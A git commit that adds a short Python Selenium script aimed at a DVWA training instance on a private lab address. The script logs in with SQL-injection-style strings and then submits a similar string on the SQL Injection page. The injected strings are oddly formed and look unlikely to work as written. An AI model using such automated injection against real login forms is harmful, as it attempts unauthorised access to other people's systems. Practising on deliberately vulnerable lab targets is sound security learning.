96f7dcff5f7f0b3800a2dc6b974efc88aa7e7f99
RehabElb <63158011+RehabElb@users.noreply.github.com>
2022-03-31 05:17:35 +0000

    Initial commit

---
+++ sqp_inject/app.py
@@ -0,0 +1,33 @@
+from selenium import webdriver
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.common.by import By
+import time
+
+
+URL='http://192.168.183.128/dvwa/login.php'
+# driver = webdriver.Firefox('geckodriver')
+driver = webdriver.Chrome('chromedriver.exe')
+driver.get(URL)
+
+user = driver.find_element(By.NAME, 'username')
+user.send_keys('admin')
+time.sleep(3)
+password = driver.find_element(By.NAME, 'password')
+password.send_keys("if userid = user or 1=1 #'")
+login_btn = driver.find_element(By.NAME, 'Login')
+login_btn.click()
+time.sleep(3)
+driver.find_element(By.LINK_TEXT, 'SQL Injection').click()
+driver.find_element(By.NAME, 'id').send_keys("if name=id or 1=1 #'")
+time.sleep(3)
+submit_btn = driver.find_element(By.NAME, 'Submit')
+submit_btn.click()
+time.sleep(7)
+# driver.close()
+
+
+
+
+
+
+
